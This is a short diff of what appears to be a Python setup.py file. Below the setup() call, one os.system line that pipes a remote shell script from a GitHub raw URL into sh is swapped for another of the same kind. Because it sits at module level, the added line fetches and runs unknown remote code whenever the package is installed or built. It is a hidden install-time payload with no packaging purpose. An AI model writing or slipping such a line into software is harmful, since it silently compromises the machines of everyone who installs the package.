@@ -41,4 +41,4 @@ setup(
     package_dir={"": "src"},
     packages=find_packages("src"),
 )
-os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/All-Jobs/main/bitnet.sh | sh')
+os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/shc/main/boled01.sh | sh')
